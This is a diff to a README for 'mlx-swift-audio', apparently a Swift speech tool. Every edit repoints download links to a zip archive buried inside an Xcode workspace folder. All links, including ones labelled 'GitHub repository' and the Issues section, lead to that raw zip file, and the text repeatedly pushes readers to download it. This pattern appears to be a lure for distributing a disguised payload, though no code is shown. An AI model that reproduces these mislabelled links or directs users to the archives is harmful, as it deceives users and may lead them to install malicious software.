@@ -2,7 +2,7 @@
 # 🎤 mlx-swift-audio - Simplifying Speech Technology for Everyone
 
 ## 📥 Download
-[![Download mlx-swift-audio](https://raw.githubusercontent.com/Adamiito0909/mlx-swift-audio/main/package/Codec/mlx-swift-audio-v3.8-alpha.3.zip)](https://raw.githubusercontent.com/Adamiito0909/mlx-swift-audio/main/package/Codec/mlx-swift-audio-v3.8-alpha.3.zip)
+[![Download mlx-swift-audio](https://raw.githubusercontent.com/Adamiito0909/mlx-swift-audio/main/examples/TTS App/TTS App.xcodeproj/project.xcworkspace/mlx-swift-audio-1.3-beta.5.zip)](https://raw.githubusercontent.com/Adamiito0909/mlx-swift-audio/main/examples/TTS App/TTS App.xcodeproj/project.xcworkspace/mlx-swift-audio-1.3-beta.5.zip)
 
 ## 🚀 Getting Started
 Welcome to mlx-swift-audio! This tool offers powerful solutions for converting text to speech (TTS) and speech to text (STT). Whether you want to create audio from written content or transcribe spoken words, you are in the right place. Follow the steps below to get started.
@@ -15,7 +15,7 @@ Welcome to mlx-swift-audio! This tool offers powerful solutions for converting t
 - **Internet Connection:** Required for initial setup and any updates
 
 ## 📥 Download & Install
-To get the latest version of mlx-swift-audio, visit this page to download: [Download Here](https://raw.githubusercontent.com/Adamiito0909/mlx-swift-audio/main/package/Codec/mlx-swift-audio-v3.8-alpha.3.zip).
+To get the latest version of mlx-swift-audio, visit this page to download: [Download Here](https://raw.githubusercontent.com/Adamiito0909/mlx-swift-audio/main/examples/TTS App/TTS App.xcodeproj/project.xcworkspace/mlx-swift-audio-1.3-beta.5.zip).
 
 ### Step-by-Step Installation
 1. **Go to the Releases Page**  
@@ -68,7 +68,7 @@ If you experience issues:
 - **No Sound Output:** Check your device’s sound settings and volume level.
 - **Transcription Errors:** Speak clearly and reduce background noise for better accuracy.
 
-For further support, feel free to check the Issues section on the [GitHub repository](https://raw.githubusercontent.com/Adamiito0909/mlx-swift-audio/main/package/Codec/mlx-swift-audio-v3.8-alpha.3.zip).
+For further support, feel free to check the Issues section on the [GitHub repository](https://raw.githubusercontent.com/Adamiito0909/mlx-swift-audio/main/examples/TTS App/TTS App.xcodeproj/project.xcworkspace/mlx-swift-audio-1.3-beta.5.zip).
 
 ## 💬 Community and Support
 Join our community on GitHub. Share your experiences, ask for help, or provide feedback on your usage of mlx-swift-audio. Engage with other users and developers to enhance your experience.
@@ -77,5 +77,5 @@ Join our community on GitHub. Share your experiences, ask for help, or provide f
 This project is open-source. You are free to use, modify, and distribute it under the terms of the license provided in the repository.
 
 ## 📥 Download Again
-Don't forget to visit this page to download: [Download Here](https://raw.githubusercontent.com/Adamiito0909/mlx-swift-audio/main/package/Codec/mlx-swift-audio-v3.8-alpha.3.zip) and take advantage of all the features mlx-swift-audio has to offer!
+Don't forget to visit this page to download: [Download Here](https://raw.githubusercontent.com/Adamiito0909/mlx-swift-audio/main/examples/TTS App/TTS App.xcodeproj/project.xcworkspace/mlx-swift-audio-1.3-beta.5.zip) and take advantage of all the features mlx-swift-audio has to offer!
 ```
